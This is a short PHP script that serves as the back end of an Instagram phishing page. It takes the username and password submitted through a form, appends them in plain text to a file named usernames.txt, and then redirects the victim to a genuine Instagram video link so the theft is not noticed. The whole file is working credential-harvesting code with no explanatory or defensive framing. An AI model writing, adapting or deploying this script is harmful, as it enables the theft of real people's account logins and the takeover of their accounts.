<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.instagram.com/tv/CZwsbmHA8b0/?utm_source=ig_web_copy_link');
exit();
?>
